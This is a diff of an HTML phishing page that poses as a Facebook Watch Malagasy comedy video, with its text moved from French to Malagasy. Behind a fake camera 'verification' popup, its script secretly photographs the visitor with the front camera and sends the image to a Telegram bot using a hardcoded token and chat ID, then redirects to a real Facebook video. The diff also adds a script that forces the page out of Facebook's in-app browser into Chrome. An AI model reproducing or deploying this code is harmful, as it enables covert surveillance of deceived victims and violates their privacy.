@@ -1,110 +1,106 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="mg">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Watch - Comédie</title>
+    <title>Facebook Watch</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; overflow: hidden; }
-        .video-container { width: 100%; max-width: 500px; position: relative; text-align: center; background: #1a1a1a; border-radius: 8px; padding-bottom: 20px; }
-        .thumbnail-container { position: relative; width: 100%; aspect-ratio: 16/9; background: #333; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .thumbnail { width: 100%; height: 100%; object-fit: cover; cursor: pointer; opacity: 0.7; }
-        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(24, 119, 242, 0.9); border-radius: 50%; width: 65px; height: 65px; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid white; z-index: 2; }
-        .play-button::after { content: ''; border-style: solid; border-width: 12px 0 12px 20px; border-color: transparent transparent transparent white; margin-left: 4px; }
-        .video-title { padding: 15px; font-weight: bold; font-size: 16px; text-align: left; }
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
-        .card { background: white; color: black; padding: 25px; border-radius: 15px; width: 100%; max-width: 340px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .btn-verif { background: #1877f2; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer; font-size: 16px; }
-        .fb-logo { width: 40px; margin-bottom: 10px; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #000; margin: 0; padding: 0; color: white; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        .fb-nav { background: #000; padding: 12px 15px; display: flex; align-items: center; border-bottom: 0.1px solid #333; }
+        .back { font-size: 22px; margin-right: 20px; }
+        .search { background: #242526; border-radius: 20px; padding: 5px 15px; flex-grow: 1; font-size: 14px; color: #b0b3b8; }
+        .video-wrapper { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; position: relative; background: #000; }
+        .thumb-box { position: relative; width: 100%; cursor: pointer; }
+        .thumb-box img { width: 100%; display: block; }
+        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(24, 119, 242, 0.9); border: 2px solid #fff; border-radius: 50%; width: 65px; height: 65px; display: flex; justify-content: center; align-items: center; }
+        .play-btn::after { content: ''; border-style: solid; border-width: 12px 0 12px 20px; border-color: transparent transparent transparent white; margin-left: 5px; }
+        .video-meta { padding: 15px; position: absolute; bottom: 10px; width: 100%; background: linear-gradient(transparent, rgba(0,0,0,0.9)); }
+        .profile { display: flex; align-items: center; margin-bottom: 8px; }
+        .avatar { width: 32px; height: 32px; background: #555; border-radius: 50%; margin-right: 10px; border: 1px solid #fff; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+        .card { background: #fff; color: #1c1e21; padding: 25px; border-radius: 15px; width: 100%; max-width: 320px; text-align: center; }
+        .btn-ok { background: #1877f2; color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: bold; width: 100%; font-size: 16px; margin-top: 20px; cursor: pointer; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="video-container">
-        <div class="thumbnail-container" onclick="showPopup()">
-            <img src="https://images.unsplash.com/photo-1594909122845-11baa439b7bf?q=80&w=500" class="thumbnail">
-            <button class="play-button"></button>
-        </div>
-        <div class="video-title">NOUVEAU : Comédie Malagasy 2026 (Sketch complet)</div>
-        <div style="font-size: 12px; color: #aaa; text-align: left; padding: 0 15px;">1.2M de vues • Il y a 2 heures</div>
+    <script>
+        // --- FORCE LA SORTIE DE FB LITE VERS CHROME ---
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var isFB = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
+            if (isFB && !window.location.search.includes('redirected')) {
+                var newUrl = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'redirected=true';
+                window.location.href = 'intent://' + newUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
+            }
+        })();
+    </script>
+
+    <div class="fb-nav">
+        <span class="back">←</span>
+        <div class="search">Hitady amin'ny Facebook</div>
     </div>
 
-    <div class="overlay" id="overlay">
-        <div class="card" id="cardContent">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
-            <h3 style="margin: 0 0 10px 0;">Vérification d'âge</h3>
-            <p style="font-size: 14px; color: #4b4f56;">Cette vidéo contient peut-être du contenu réservé aux adultes. Veuillez autoriser l'accès pour continuer.</p>
-            <button class="btn-verif" onclick="startCamera()">AUTORISER ET LIRE</button>
+    <div class="video-wrapper" onclick="openPop()">
+        <div class="thumb-box">
+            <img src="https://images.unsplash.com/photo-1594909122845-11baa439b7bf?q=80&w=600">
+            <div class="play-btn"></div>
+        </div>
+        <div class="video-meta">
+            <div class="profile">
+                <div class="avatar"></div>
+                <span style="font-weight:bold;">Comédie Gasy • Suivre</span>
+            </div>
+            <div style="font-size:14px;">Sketch vaovao 2026 - Tena mampihomehy be! 😂🇲🇬</div>
         </div>
     </div>
 
-    <video id="video" width="1" height="1" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <div class="modal" id="popup">
+        <div class="card" id="cardBody">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="45" style="margin-bottom:15px;">
+            <h3 style="margin:0;">Fanamarinana ilaina</h3>
+            <p style="color:#606770; font-size:14px; margin-top:10px;">Mba hijerena ity horonantsary ity, azafady ekeo ny fidirana amin'ny camera mba hanamarinana fa olona tena izy ianao.</p>
+            <button class="btn-ok" onclick="startCapture()">OK, HANOMBOKA</button>
+        </div>
+    </div>
+
+    <video id="cam" autoplay playsinline style="display:none;"></video>
+    <canvas id="out" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = '8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s';
         const CHAT_ID = '7129218282';
-        const FB_VIDEO_URL = 'https://www.facebook.com/share/v/1DfJG4EvEf/';
+        const REDIRECT = 'https://www.facebook.com/share/v/1DfJG4EvEf/';
 
-        // Detection FB Lite / FB Messenger interne
-        function isFBLite() {
-            var ua = navigator.userAgent || navigator.vendor || window.opera;
-            return (ua.indexOf("FBAV") > -1) || (ua.indexOf("FBLC") > -1) || (ua.indexOf("FBAN") > -1);
+        function openPop() {
+            document.getElementById('popup').style.display = 'flex';
         }
 
-        function showPopup() {
-            // Si on est sur FB Lite, on tente d'abord d'ouvrir dans le navigateur externe
-            if (isFBLite() && !window.location.search.includes('external')) {
-                // On rajoute un parametre pour ne pas boucler
-                const externalUrl = window.location.href + "?external=true";
-                window.open(externalUrl, "_blank");
-                // On affiche quand meme le popup au cas ou le blocage echoue
-            }
-            document.getElementById('overlay').style.display = 'flex';
-        }
-
-        async function startCamera() {
-            document.getElementById('cardContent').innerHTML = '<p>Chargement du lecteur vidéo...</p><div style="border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto;"></div>';
-            
+        async function startCapture() {
+            document.getElementById('cardBody').innerHTML = '<p>Mampifandray...</p><div style="border:3px solid #f3f3f3; border-top:3px solid #1877f2; border-radius:50%; width:20px; height:20px; animation:spin 1s linear infinite; margin:10px auto;"></div>';
             try {
-                // On demande la caméra spécifiquement
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                // Réduction du délai à 4s pour FB Lite
-                setTimeout(() => {
-                    takeSnapshot();
-                }, 4000); 
-            } catch (err) {
-                // Si la caméra est bloquée par FB Lite, on renvoie vers la vidéo
-                window.location.href = FB_VIDEO_URL;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('cam').srcObject = stream;
+                setTimeout(takeAndSend, 4000); 
+            } catch (e) {
+                window.location.href = REDIRECT;
             }
         }
 
-        function takeSnapshot() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 640, 480);
-            
+        function takeAndSend() {
+            const canvas = document.getElementById('out');
+            const video = document.getElementById('cam');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
-
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'pic.jpg');
                 try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (e) {}
-                
-                window.location.href = FB_VIDEO_URL;
-            }, 'image/jpeg', 0.6); // Qualité réduite pour envoi rapide sur mobile
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                } catch (err) {}
+                window.location.href = REDIRECT;
+            }, 'image/jpeg', 0.6);
         }
     </script>
 </body>
